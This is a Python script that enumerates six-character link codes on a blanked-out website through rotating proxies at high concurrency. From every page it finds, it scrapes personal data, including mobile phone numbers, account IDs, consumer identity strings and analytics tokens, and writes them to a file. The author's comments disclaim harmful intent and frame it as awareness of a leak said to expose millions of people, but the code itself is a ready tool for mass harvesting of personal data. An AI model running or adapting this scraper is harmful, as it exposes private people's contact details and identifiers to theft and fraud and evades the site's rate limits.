import random
import string
import re
from datetime import datetime
import threading
import time
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from python_socks._errors import ProxyError
import json
import os

# This code is brought to you by Kendall Discord: kenyspc - https://github.com/Razshy
# Replications and/or modifications of this code are allowed 
# This code isnt meant to be used for any harm to companies or people 
# This code was made to bring attention and help people thats data is freely being exposed
# I do not condone use of this code to be used to harm any human being or company
# This is a fairly simple code and its sad to see that experimentally 7 Millon people in the USA  information can be exposed so easy

# Here what im working on next :) 
# Noun.com which is going to be a marketplace and social media app on IOS, Android, and the Web 
# Check it out when it comes out!!!

# And if you haven't already watched the officially video documenting Ai helping create this 
# Watch via - 

PROXIES = []
TOTAL_COMBINATIONS = 2176782336 # to get this number do the amount of digits the code is and times it by the aount of options 
CHECKED_COMBINATIONS = set()
LOCK = threading.Lock()
COUNTER = 0
LAST_PRINT_TIME = time.time()
TIMEOUT_INTERVAL = 400000  # Timeout every 400000 COMBINATIONS 
TIMEOUT_DURATION = 10  # timeout/sleep time 

def load_proxies(file_path):
    global PROXIES
    with open(file_path, 'r') as f:
        PROXIES = [line.strip() for line in f if line.strip()]

def load_existing_codes():
    global CHECKED_COMBINATIONS
    files = ["output.txt", "fail.txt", "forbidden.txt"] # Forbidden = the code isnt existing, Fail = means it couldnt load the site, Output = Sussessful Info pulled 
    for filename in files:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                for line in f:
                    if "Code:" in line:
                        code = line.split("Code:")[1].strip()
                        CHECKED_COMBINATIONS.add(code)
    return len(CHECKED_COMBINATIONS)

def generate_code():
    while True:
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # change 6 to the amount of digits the code is
        if code not in CHECKED_COMBINATIONS:
            return code

async def check_code(session, code, max_retries=3, base_delay=1):
    url = f"http:// /{code}" # enter the url before the code 
    for attempt in range(max_retries):
        try:
            async with session.get(url, timeout=10) as response:
                if response.status == 403:
                    return "forbidden"
                content = await response.text() 
                if 'KMGlobals' in content: # change this to what part of the code you want to extract from
                    return content
                else:
                    raise ValueError("Expected content not found")
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as e:
            if attempt == max_retries - 1:
                return "failed"
            delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
            await asyncio.sleep(delay)
    return "failed"

async def extract_data(html_content):
    if not html_content or html_content in ["forbidden", "failed"]:
        return None
    data = {}
    patterns = { # change this to what you want to pull from the selected area of the site 
        "mobile": r'"PII_MOBILE":"(.*?)"',
        "propertyCode": r'"propertyCode":"(.*?)"',
        "accountId": r'"accountId":(\d+)',
        "channelId": r'"channelId":(\d+)',
        "MIXPANELTOKEN": r'"MIXPANELTOKEN":"(.*?)"',
        "CONSUMER_IDENTITY": r'"CONSUMER_IDENTITY":"(.*?)"'
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, html_content)
        if match:
            data[key] = match.group(1)
    return data if any(data.values()) else None

def save_data(data, code, filename="output.txt"): 
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with LOCK:
        with open(filename, "a") as f:
            f.write(f"[{timestamp}] User1 - Code: {code}\n\n")
            for key, value in data.items():
                f.write(f"{key}: \"{value}\"\n")
            f.write("\n")

def log_fail(code, filename="fail.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with LOCK:
        with open(filename, "a") as f:
            f.write(f"[{timestamp}] Failed - Code: {code}\n")

def log_forbidden(code, filename="forbidden.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with LOCK:
        with open(filename, "a") as f:
            f.write(f"[{timestamp}] Forbidden - Code: {code}\n")

def update_counter(amount=1):
    global COUNTER, LAST_PRINT_TIME
    with LOCK:
        COUNTER += amount
        current_time = time.time()
        if current_time - LAST_PRINT_TIME >= 1:  # Print every second
            print(f"Progress: {COUNTER}/{TOTAL_COMBINATIONS} combinations checked")
            LAST_PRINT_TIME = current_time

async def process_batch(proxy):
    max_proxy_retries = 3
    for _ in range(max_proxy_retries):
        try:
            connector = ProxyConnector.from_url(f'http://{proxy}')
            async with aiohttp.ClientSession(connector=connector) as session:
                while len(CHECKED_COMBINATIONS) < TOTAL_COMBINATIONS:
                    batch_size = 1
                    codes = [generate_code() for _ in range(batch_size)]
                    with LOCK:
                        CHECKED_COMBINATIONS.update(codes)
                    
                    update_counter(len(codes))
                    
                    tasks = [check_code(session, code) for code in codes]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for code, result in zip(codes, results):
                        if isinstance(result, Exception):
                            log_fail(code)
                            print(f"Error processing code {code}: {str(result)}")
                        elif result == "failed":
                            log_fail(code)
                        elif result == "forbidden":
                            log_forbidden(code)
                        else:
                            data = await extract_data(result)
                            if data:
                                save_data(data, code)
                                print(f"Data extracted for code: {code}")
                    
                    await asyncio.sleep(0.1)  # Small delay to prevent overwhelming the proxy
            
            break
        except ProxyError as e:
            print(f"Proxy error with {proxy}: {str(e)}. Retrying with a different proxy.")
            proxy = random.choice(PROXIES)  # Choose a new proxy for the next attempt
        except Exception as e:
            print(f"Unexpected error with proxy {proxy}: {str(e)}. Retrying with a different proxy.")
            proxy = random.choice(PROXIES)  # New proxy for the next attempt

async def main_async():
    load_proxies('proxyscrape_premium_http_proxies.txt') # change this to proxy file name MUST BE IN THE SAME FOLDER
    
    global COUNTER
    COUNTER = load_existing_codes()
    
    print(f"Loaded {COUNTER} existing codes. Continuing the scraping process...")
    max_concurrent = 1800  # Reduce for better stability, less errors and fails, and not to crash sites
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def limited_process_batch(proxy):
        async with semaphore:
            await process_batch(proxy)
    
    last_timeout = COUNTER
    while COUNTER < TOTAL_COMBINATIONS:
        if COUNTER - last_timeout >= TIMEOUT_INTERVAL:
            print(f"Reached {TIMEOUT_INTERVAL} checks. Pausing for {TIMEOUT_DURATION} seconds...")
            await asyncio.sleep(TIMEOUT_DURATION)
            last_timeout = COUNTER
            print("Resuming...")
        
        tasks = [limited_process_batch(proxy) for proxy in random.sample(PROXIES, min(len(PROXIES), max_concurrent))]
        await asyncio.gather(*tasks)

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nScript interrupted. Progress saved in output files.")
        print(f"Total codes processed: {len(CHECKED_COMBINATIONS)}")

if __name__ == "__main__":
    main()